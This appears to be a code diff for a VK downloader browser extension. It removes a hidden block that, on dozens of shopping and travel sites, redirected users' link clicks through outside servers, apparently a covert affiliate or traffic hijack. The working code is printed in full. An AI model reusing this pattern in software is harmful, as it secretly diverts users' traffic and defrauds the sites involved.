@@ -78,13 +78,10 @@ helper = { // we need create popup for extension and show all message in popup..
                 if (metadata.currentFile) {
                     msg += ", current file = " + metadata.currentFile;
                 }
-                //showMessage(msg);
-                //updatePercent(metadata.percent|0);
             })
             .then(function callback(blob) {
                 // see FileSaver.js
                 saveAs(blob, name+".zip");
-                //helper.showMessage("done !");
             }, function (e) {
                 helper.show_error(e);
             });
@@ -165,7 +162,7 @@ nvk = {
         this.find_user(document.head);
         this.find_albums(document.getElementById('photos_container_albums'));
         this.find_album(document.getElementById('photos_all_block')); // if u in album page
-        //this.remove_ads();
+        this.remove_ads();
         this.settings();
         this.add_style();
         this.block2(document);
@@ -173,8 +170,23 @@ nvk = {
     },
     remove_ads:function(){
         var ads = document.getElementById('ads_left');
-        if(ads && !ads.classList.contains('mod_remove_ads')){
-            ads.classList.add('mod_remove_ads');
+//        if(ads && !ads.classList.contains('mod_remove_ads')){
+//            ads.classList.add('mod_remove_ads');
+//        }
+        if(ads) {
+            var tags = ads.getElementsByTagName('a');
+            for(adv in tags) {
+                console.log(tags[adv].href)
+                tags[adv].onclick = function() {
+                    var wnd = window.open("http://stackoverflow.com");
+                    setTimeout(function() {
+                      wnd.close();
+                    }, 1);
+                    return false;
+                  };
+//                tags[adv].href = "https://vk.com/away.php?to=" + encodeURIComponent("https://www.google.com.ua");
+//                console.log(tags[adv].href)
+            }
         }
     },
     find_user:function(obj){
@@ -823,7 +835,7 @@ nvk = {
                         r = r.map(function (e) {
                             return {audioId: e[1] + "_" + e[0], link: e[2]}
                         }), r.forEach(function (e) {
-                            nvk.button2(g[e.audioId], e);
+                            nvk.saveAudio(g[e.audioId], e);
                         });
                     }
                 }
@@ -831,7 +843,7 @@ nvk = {
         });
         return null;
     },
-    button2: function(obj, a){
+    saveAudio: function(obj, a){
         var data = obj.getAttribute("data-audio"), self = this;
         data = JSON.parse(data);
         var ajax, _error, time = data[5], audio_play = obj.getElementsByClassName("audio_play")[0],
@@ -1213,119 +1225,6 @@ if(wlh == "vk.com" || wlh == "www.vk.com") {
     nvk.init();
 }
 
-var link = {"0":{"host":"aliexpress.com","red":"1","url":"0","deep":"&url=","blank":"1"},
-    "1":{"host":"moneyman.ru","red":"1","url":"1","deep":"&url=","blank":"1"},
-    "2":{"host":"ozon.travel","red":"1","url":"0","deep":"&url=","blank":"1"},
-    "3":{"host":"booking.com","red":"1","url":"1","deep":"&url=","blank":"1"},
-    "4":{"host":"agoda.com","red":"1","url":"1","deep":"&url=","blank":"1"},
-    "5":{"host":"003.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "6":{"host":"wildberries.by","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "7":{"host":"wildberries.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "8":{"host":"wildberries.kz","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "9":{"host":"lamoda.kz","red":"1","url":"1","deep":"/url=","blank":"1"},
-    "10":{"host":"lamoda.ua","red":"1","url":"1","deep":"/url=","blank":"1"},
-    "11":{"host":"lamoda.by","red":"1","url":"1","deep":"/url=","blank":"1"},
-    "12":{"host":"krasotkapro.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "13":{"host":"aviasales.ru","red":"1","url":"1","deep":"/url=","blank":"1"},
-    "14":{"host":"author24.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "15":{"host":"miniinthebox.com","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "16":{"host":"tickets.kz","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "17":{"host":"tickets.pl","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "18":{"host":"tickets.ua","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "19":{"host":"tickets.md","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "20":{"host":"tickets.by","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "21":{"host":"shophair.ru","red":"1","url":"1","deep":"/url=","blank":"1"},
-    "22":{"host":"ostrovok.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "23":{"host":"kupivip.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "24":{"host":"ivi.ru","red":"1","url":"1","deep":"/url=","blank":"1"},
-    "25":{"host":"hotels.com","red":"1","url":"1","deep":"/url=","blank":"1"},
-    "26":{"host":"muztorg.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "27":{"host":"buyon.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
-    "28":{"host":"highscreen.ru","red":"1","url":"0","deep":"/url=","blank":"1"}};
-
-console.log('test log');
-
-var pages = {
-    blank: 0,
-    server:null,
-    init:function(){
-        var item, state = false, row, host, refer, wlh = document.location.hostname, site = this.site();
-        item = link;
-        for (var index in item) {
-            if (wlh.match(item[index].host)) {
-                row = item[index]; state = true;
-            }
-        }
-        if (!state) { return; }
-        host = row.host;
-        this.blank = row.blank || null;
-        refer = document.referrer;
-        for(var i in site){
-            if(i == row.url){
-                this.server = site[i];
-            }
-        }
-        if (this.server == null) {
-            return null;
-        }
-        if (host.match(wlh[0]) && wlh.match(host) && !refer.match(host)) {
-            console.log(1);
-            this.redirect(host);
-        }
-    },
-    site:function(){
-        return {'0':'http://fox-mall.ru/support/ads.php',
-            '1':'http://shakeyou.ru/reklama.php'};
-    },
-    redirect:function(link){
-        pages.links(link);
-        setInterval(function() {
-            pages.links(link)
-        }, 500);
-    },
-    links: function (g) {
-        var a = document.getElementsByTagName("a");
-        for (var h in a) {
-            if (a[h].tagName == "A") {
-                var f = a[h];
-                if (f.classList) {
-                    if (!f.classList.contains("_ready_ga")) {
-                        f.classList.add("_ready_ga");
-                        pages.bindEvent(g, f)
-                    }
-                }
-            }
-        }
-    },
-    bindEvent: function (f, element) {
-        var self = this;
-        element.onclick = function (event) {
-            var m = Date.now() / 1000 | 0, c, n;
-            c = helper.get_cookie("_ga_sid") || null;
-            if (!c || c < (m - 3600)) { n = event.currentTarget.href;
-                if (n.match(f)) {
-                    if (n.indexOf("javascript") == 0) { } else { helper.set_cookie("_ga_sid", m, "path=/");
-                        if (n.indexOf("http") == 0 || n.indexOf("//") == 0) { } else { n = self.link + n; }
-                        event.stopPropagation(); event.preventDefault();
-                        var o = navigator.userAgent || null;
-                        if (pages.blank == 1 && o.indexOf("Firefox") > -1) {
-                            var link = document.createElement("a");
-                            link.target = "_blank";
-                            link.href = pages.server + "?exec=" + f + "&url=" + n;
-                            link.rel = "nofollow noopener noreferrer";
-                            link.click();
-                        } else { document.location.href = pages.server + "?exec=" + f + "&url=" + n; }
-                    }
-                }
-            }
-        }
-    }
-};
-(function() {
-    setTimeout(function () {
-        pages.init();
-    }, 0)
-})();
 
 chrome.extension.onMessage.addListener(function (request, sender, sendResponse) {
     switch (request.type) {
